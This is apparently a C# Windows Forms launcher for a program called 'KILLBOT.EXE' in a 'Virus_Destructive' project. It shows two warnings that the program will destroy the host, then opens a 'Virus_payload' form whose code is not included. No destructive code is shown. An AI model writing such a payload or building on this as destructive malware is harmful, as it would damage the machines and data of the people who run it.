using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Virus_Destructive
{
    public partial class Virus : Form
    {
        public Virus()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
        }

        private void Virus_Load(object sender, EventArgs e)
        {
            if (MessageBox.Show("This is a very destructive virus and I do not recommend you to run this on your host. Press YES to continue or press NO to exit.", "KILLBOT.EXE", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                this.Close();
                Application.Exit();
            }
            else
            {
                Last_Warning();
            }
        }
        public void Last_Warning()
        {
            if (MessageBox.Show("THIS IS THE LAST WARNING! RUNNING THIS ON YOUR MAIN MACHINE WILL RUIN EVERYTHING YOU\'VE DONE ON HERE!", "KILLBOT.EXE", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                this.Close();
                Application.Exit();
            }
            else
            {
                go_to_payload();
            }
        }

        public void go_to_payload()
        {
            this.Hide();
            var NewForm = new Virus_payload();
            NewForm.ShowDialog();
            this.Close();
        }
    }
}
